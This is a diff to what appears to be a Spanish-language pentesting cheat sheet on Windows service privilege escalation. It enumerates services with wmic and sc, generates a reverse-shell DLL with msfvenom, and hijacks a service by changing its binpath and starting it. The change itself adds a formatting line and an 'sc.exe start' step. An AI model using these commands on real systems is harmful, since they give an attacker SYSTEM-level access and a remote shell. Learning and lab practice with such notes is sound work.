@@ -9220,7 +9220,6 @@ Para no obtener los de System32 y solo los de auto
 wmic service get name,displayname,pathname,startmode  | findstr /i /v "c:\windows"
 ```
 
-
 List Services
 
 ```c
@@ -9258,7 +9257,6 @@ sc qc SERVICE_NAME
 cmd /c "sc start monitor1" // in powershell
 ```
 
-
 Ver si Localsystem lo corre
 
 ```c
@@ -9266,8 +9264,15 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=444 -a x64 -f dll -o Cu
 ```
 
 Podemos cambiar el path the ejecucion del servicio
+
 ```c
 sc config SERVICE_NAME binpath="C:\PATH_CON_PERMISOS"
+```
+
+Poner el servicio en marcha
+
+```c
+sc.exe start NAME_OF_SERVICE
 ```
 
 Poner un listener y empezar el servicio
